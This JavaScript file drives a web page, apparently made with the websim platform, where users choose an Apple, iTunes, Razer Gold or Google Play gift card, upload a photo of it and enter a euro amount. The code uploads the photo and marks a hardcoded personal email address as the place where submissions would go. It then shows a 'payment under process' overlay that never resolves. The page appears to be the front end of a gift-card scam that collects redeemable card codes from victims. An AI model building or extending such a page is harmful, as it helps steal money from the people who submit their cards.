document.addEventListener('DOMContentLoaded', () => {
    const giftcardOptions = document.querySelectorAll('.giftcard-option');
    const giftcardSelectionSection = document.getElementById('giftcard-selection');
    const giftcardDisplayArea = document.getElementById('giftcard-display-area');
    const selectedCardTitle = document.getElementById('selected-card-title');
    const selectedGiftcardImage = document.getElementById('selected-giftcard-image');
    const backToSelectionBtn = document.getElementById('back-to-selection-btn');
    const rateAmountInput = document.getElementById('rate-amount');
    const uploadPhotoBtn = document.getElementById('upload-photo-btn');
    const uploadPhotoInput = document.getElementById('upload-photo-input');
    const takePictureBtn = document.getElementById('take-picture-btn');
    const takePictureInput = document.getElementById('take-picture-input');

    // New elements for image preview and submission
    const imagePreviewContainer = document.getElementById('image-preview-container');
    const uploadedImagePreview = document.getElementById('uploaded-image-preview');
    const submitGiftcardBtn = document.getElementById('submit-giftcard-btn');
    const paymentProcessingOverlay = document.getElementById('payment-processing-overlay');
    // const paymentStatusMessageEl = document.getElementById('payment-status-message'); // Message is static in HTML

    let currentSelectedFile = null; // To store the file object for potential upload
    const userEmailForNotifications = "usman2006dabzy@gmail.com"; // User specified email

    const giftCardImageMap = {
        apple: '/apple-gift-card.png',
        itunes: '/itunes-gift-card.png',
        razer: '/razer-gold-gift-card.png',
        google: '/google-play-gift-card.png'
    };

    function resetImagePreviewAndSubmit() {
        if (uploadedImagePreview.src && uploadedImagePreview.src !== '#') {
            URL.revokeObjectURL(uploadedImagePreview.src); // Clean up blob URL
        }
        uploadedImagePreview.src = '#';
        imagePreviewContainer.style.display = 'none';
        submitGiftcardBtn.style.display = 'none';
    }

    giftcardOptions.forEach(button => {
        button.addEventListener('click', () => {
            const cardType = button.dataset.card;
            const cardName = button.dataset.name;

            if (giftCardImageMap[cardType]) {
                selectedCardTitle.textContent = cardName;
                selectedGiftcardImage.src = giftCardImageMap[cardType];
                selectedGiftcardImage.alt = cardName;
                
                giftcardSelectionSection.style.display = 'none';
                giftcardDisplayArea.style.display = 'block';
                rateAmountInput.value = ''; // Clear previous rate
                resetImagePreviewAndSubmit(); // Reset preview when changing card
            } else {
                console.error('Gift card type not found:', cardType);
            }
        });
    });

    if (backToSelectionBtn) {
        backToSelectionBtn.addEventListener('click', () => {
            giftcardDisplayArea.style.display = 'none';
            giftcardSelectionSection.style.display = 'block';
            selectedGiftcardImage.src = "#"; 
            selectedGiftcardImage.alt = "Selected Gift Card";
            rateAmountInput.value = ''; 
            resetImagePreviewAndSubmit();
        });
    }

    function handleFileSelect(file) {
        if (file) {
            console.log('File selected:', file.name);
            currentSelectedFile = file; // Store the file object
            // Revoke previous object URL if one exists
            if (uploadedImagePreview.src && uploadedImagePreview.src.startsWith('blob:')) {
                URL.revokeObjectURL(uploadedImagePreview.src);
            }
            const imageURL = URL.createObjectURL(file);
            uploadedImagePreview.src = imageURL;
            imagePreviewContainer.style.display = 'block';
            submitGiftcardBtn.style.display = 'block'; // Or 'inline-block' etc.
            // Note: The alert for "file selected" is removed as per new flow.
        }
    }

    if (uploadPhotoBtn && uploadPhotoInput) {
        uploadPhotoBtn.addEventListener('click', () => {
            uploadPhotoInput.click(); 
        });
        uploadPhotoInput.addEventListener('change', (event) => {
            handleFileSelect(event.target.files[0]);
        });
    }

    if (takePictureBtn && takePictureInput) {
        takePictureBtn.addEventListener('click', () => {
            takePictureInput.click();
        });
        takePictureInput.addEventListener('change', (event) => {
            handleFileSelect(event.target.files[0]);
        });
    }

    if (submitGiftcardBtn) {
        submitGiftcardBtn.addEventListener('click', async () => {
            const rateAmount = rateAmountInput.value.trim();
            const cardName = selectedCardTitle.textContent || "Selected Gift Card";

            if (!currentSelectedFile) {
                alert('Please upload or take a picture of your gift card.');
                return;
            }
            if (!rateAmount) {
                alert('Please enter the rate amount for the gift card.');
                rateAmountInput.focus();
                return;
            }

            if (paymentProcessingOverlay) {
                const statusMessageEl = document.getElementById('payment-status-message');
                if(statusMessageEl) statusMessageEl.textContent = 'Uploading gift card photo...';
                paymentProcessingOverlay.style.display = 'flex';
            }
            
            try {
                // Attempt to upload the file using websim.upload
                const uploadedFileUrl = await websim.upload(currentSelectedFile);
                console.log(`Gift card photo uploaded successfully. URL: ${uploadedFileUrl}`);

                // Log gift card submission activity
                logActivity({
                    type: 'Gift Card Submission',
                    description: `Submitted ${cardName} photo. Rate: €${rateAmount}. File: ${currentSelectedFile.name}, URL: ${uploadedFileUrl}`
                });

                // Simulate backend processing for email notification
                 console.log(`Simulating backend process: Gift card photo URL ${uploadedFileUrl} (Rate: €${rateAmount}) would be sent to ${userEmailForNotifications}.`);

                // Update status message for successful upload and "processing"
                if (paymentProcessingOverlay) {
                     const statusMessageEl = document.getElementById('payment-status-message');
                    // The original message is "YOUR PAYMENT IS UNDER PROCESS PLEASE WAIT FOR SOME MINUTES. THANKS."
                    // We can keep it or update it if needed. For now, let's keep the original for consistency.
                    if(statusMessageEl) statusMessageEl.textContent = 'YOUR PAYMENT IS UNDER PROCESS PLEASE WAIT FOR SOME MINUTES. THANKS.';
                }

                // Note: The original prompt didn't specify redirecting from here after submission,
                // so the overlay remains visible. If redirection is needed, it would be added here.
                // For example, after a timeout:
                // setTimeout(() => {
                //    if (paymentProcessingOverlay) paymentProcessingOverlay.style.display = 'none';
                //    window.location.href = 'app.html'; // Or back to deposit options
                // }, 3000);


            } catch (error) {
                console.error('Error uploading gift card photo:', error);
                alert('Failed to upload gift card photo. Please try again.');
                if (paymentProcessingOverlay) {
                    paymentProcessingOverlay.style.display = 'none';
                }
            }
        });
    }
});

// Helper function (ensure it's defined, e.g., by activity-log.js or locally)
if (typeof logActivity === 'undefined') {
    function logActivity(activity) {
        let activities = JSON.parse(localStorage.getItem('userActivities')) || [];
        activities.unshift({ ...activity, timestamp: new Date().toISOString() });
        const MAX_ACTIVITIES = 50;
        if (activities.length > MAX_ACTIVITIES) {
            activities = activities.slice(0, MAX_ACTIVITIES);
        }
        localStorage.setItem('userActivities', JSON.stringify(activities));
    }
}